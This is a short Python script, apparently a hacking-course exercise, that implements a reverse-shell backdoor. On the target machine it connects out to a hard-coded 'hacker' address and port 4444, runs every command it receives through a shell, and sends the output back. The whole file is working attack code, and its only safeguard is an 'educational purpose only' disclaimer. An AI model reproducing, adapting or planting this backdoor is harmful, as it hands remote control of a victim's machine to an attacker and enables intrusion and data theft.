#!/user/bin/env python
"""
Author：Seldon Pang

Establish a reverse connection from the target machine
Please use for educational purpose only...
"""

import socket
# https://docs.python.org/2/library/socket.html
import subprocess


class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
        # self.connection.send("\n[+] Connection established from " + str(ip))

    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True)

    def run(self):
        while True:
            received_command = self.connection.recv(1024)
            command_result = self.execute_system_command(received_command)
            self.connection.send(command_result)

        connection.close()


# Replace ip with the ip of the 'hacker' computer
my_backdoor = Backdoor("192.168.1.24", 4444)
my_backdoor.run()
